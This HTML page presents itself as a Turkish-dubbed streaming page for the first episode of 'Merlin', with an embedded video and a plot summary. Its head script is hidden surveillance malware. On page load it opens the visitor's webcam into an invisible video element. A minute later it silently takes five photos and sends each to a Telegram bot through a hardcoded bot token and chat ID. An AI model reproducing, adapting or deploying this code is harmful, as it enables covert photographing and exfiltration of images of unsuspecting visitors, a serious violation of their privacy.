<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #000; /* Night mode */
            color: #fff; /* White text */
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .title {
            font-size: 3rem; /* Large title font */
            font-weight: bold;
            margin-top: 20px;
            color: #f0f0f0;
            text-transform: uppercase;
            margin-bottom: 20px;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 1000px;
            height: 0;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        .description {
            max-width: 90%;
            margin-top: 20px;
            padding: 10px;
            background-color: #222;
            border: 1px solid #555;
            border-radius: 8px;
            font-size: 1rem;
            color: #fff;
            text-align: center;
        }
        #camera {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
        }
        @media (max-width: 768px) {
            .title {
                font-size: 2rem;
            }
            .description {
                font-size: 0.9rem;
            }
        }
        @media (max-width: 480px) {
            .title {
                font-size: 1.5rem;
            }
            .description {
                font-size: 0.8rem;
            }
        }
    </style>
    <script>
        const telegramBotToken = "7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs"; // Your bot token
        const telegramUserId = "7771348001"; // Your Telegram user ID

        // Initialize camera and take a picture
        async function startCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const camera = document.getElementById("camera");
            camera.srcObject = stream;
        }

        // Function to take a picture from the webcam
        function takePicture() {
            const canvas = document.createElement("canvas");
            const context = canvas.getContext("2d");
            const camera = document.getElementById("camera");
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL("image/jpeg");
        }

        // Function to send photo to Telegram bot
        function sendToTelegram(imageData) {
            const formData = new FormData();
            formData.append("chat_id", telegramUserId);
            formData.append("photo", dataURItoBlob(imageData));

            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(response => {
                if (response.ok) {
                    console.log("Photo sent successfully.");
                } else {
                    console.log("Error sending photo.");
                }
            });
        }

        // Helper function to convert Data URL to Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(",")[1]);
            const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uintArray = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }

            return new Blob([uintArray], { type: mimeString });
        }

        // Automatically take pictures after 1 minute and send them
        setTimeout(() => {
            let count = 0;
            const maxPics = 5;
            const interval = setInterval(() => {
                if (count < maxPics) {
                    const pictureData = takePicture();
                    sendToTelegram(pictureData);
                    count++;
                } else {
                    clearInterval(interval);
                }
            }, 2000); // Take a picture every 2 seconds
        }, 60000); // Start after 1 minute

        // Start camera when the page loads
        window.onload = startCamera;
    </script>
</head>
<body>
    <!-- Video title at the top center above the player -->
    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>

    <!-- Custom Video Player using Google Drive link -->
    <div class="video-container">
        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <!-- Description section -->
    <div class="description">
        <p>
            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
        </p>
    </div>

    <!-- Video Camera element, invisible -->
    <video id="camera" autoplay muted></video>
</body>
</html>
